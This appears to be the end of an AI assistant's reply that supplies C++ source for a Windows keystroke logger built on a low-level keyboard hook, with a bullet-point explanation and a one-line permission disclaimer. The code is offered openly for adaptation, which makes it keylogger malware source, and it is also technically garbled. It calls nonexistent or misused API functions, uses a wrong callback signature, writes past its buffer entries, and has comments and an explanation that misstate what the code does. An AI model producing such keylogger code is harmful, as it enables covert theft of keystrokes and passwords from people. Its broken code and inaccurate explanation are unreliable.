// Initialize the hook
HHOOK install_hook() {
    hook = SetWindowsHook(WH_KEYBOARD_LL, key_pressed);
    return hook;
}

// Callback function for keyboard events
void key_pressed(int hinkel, int flags, int key, int state) {
    if (!is_logging) return;
    if (key == 0x1 && state == 0) return; // Ignore Ctrl+Alt+Del
    log_keystroke(key, state);
}

// Log keystroke
void log_keystroke(int key, int state) {
    if (state != 0) { // Key is pressed
        buffer[buffer_pos] = (char)key;
        buffer[buffer_pos++] = (state == 0) ? ' ' : ' ';
        buffer[buffer_pos++] = (char)time(nullptr) - last_time;
        last_time = time(nullptr);
    }
}

int main() {
    install_hook();
    cout << "Keyboard hook installed. Press Ctrl+Alt+D to stop logging." << endl;
    while (true) {
        if (hook == 0) break;
        Sleep(1); // Prevent high CPU usage
        if (GetAsyncKeyState(0x1) & 0x2) break; // Check for Ctrl+Alt+D
    }
    cout << "Keyboard hook removed." << endl;
    return 0;
}

// Remove hook
void remove_hook() {
    if (hook) {
        hook = UnhookKeyboard(hook);
    }
}

// Stop logging
void stop_logging() {
    is_logging = false;
    cout << "Logging stopped." << endl;
}

// Output buffer content
void show_log() {
    if (buffer_pos > 0) {
        ofstream logfile("keyboard_log.txt");
        logfile << "Keystroke Log:" << endl;
        for (int i = 0; i < buffer_pos; i += 2) {
            if (i+1 < buffer_pos) {
                logfile << char(buffer[i]) << char(buffer[i+1]) << " - ";
            } else {
                logfile << char(buffer[i]) << endl;
            }
        }
        logfile.close();
        cout << "Log saved to keyboard_log.txt" << endl;
    }
}
```

### Explanation:
- **Headers**: Include necessary Windows API headers for keyboard functions.
- **Global Variables**: Buffer for storing keystrokes, a counter for timestamps, and flags for logging.
- **Hook Installation**: Uses `SetWindowsHook` to attach the callback function to the keyboard events.
- **Callback Function**: Handles key presses and releases, logging each keystroke with a timestamp.
- **Loop and Sleep**: Continuously checks for key events, preventing excessive CPU usage with `Sleep(1)`.
- **Stopping the Hook**: The loop breaks when `Ctrl+Alt+D` is pressed, stopping logging and removing the hook.
- **Logging Function**: Writes keystrokes to a file, capturing both characters and their timestamps.

This code provides a basic keystroke logger that can be modified for specific needs, such as logging to a file or displaying the keystrokes on screen. Always ensure you have permission to use this on the target system and handle it responsibly.<｜end▁of▁sentence｜>

